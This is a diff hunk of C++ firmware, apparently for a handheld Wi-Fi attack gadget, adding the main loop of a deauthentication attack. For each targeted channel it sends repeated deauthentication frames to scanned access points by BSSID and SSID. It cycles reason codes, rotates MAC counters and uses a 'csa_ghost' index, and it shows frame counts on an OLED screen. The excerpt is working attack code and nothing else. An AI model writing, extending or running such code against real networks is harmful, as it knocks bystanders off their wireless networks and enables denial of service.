@@ -96,3 +96,27 @@ static void _runDeauthLoop() {
                 last_ch = ch;
             }
 
+            if (g_deauth_channels.count(ch)) {
+                ledSetBlue(true);
+                const bool is_5g = is5GhzChannel(ch);
+                const int pulses = g_app.config.frames_per_deauth;
+                const std::vector<int>& indices = g_deauth_channels[ch];
+
+                for (int i = 0; i < pulses; i++) {
+                    uint16_t reason = reasons[i % (sizeof(reasons) / sizeof(reasons[0]))];
+                    for (int idx : indices) {
+                        if (idx < 0 || (size_t)idx >= g_scan_results.size()) continue;
+                        WiFiScanResult& ap = g_scan_results[(size_t)idx];
+                        g_app.sent_frames += _sendDeauthPulseForTarget(
+                            ap.bssid, ap.ssid.c_str(), is_5g, reason, fast_mac_counter, csa_ghost_idx);
+                    }
+                    if ((i & 3) == 3) {
+                        oled_show_deauth(total_targets, g_app.sent_frames);
+                    }
+                    delay(1);
+                }
+                ledSetBlue(false);
+            }
+            oled_show_deauth(total_targets, g_app.sent_frames);
+        }
+        delay(1);
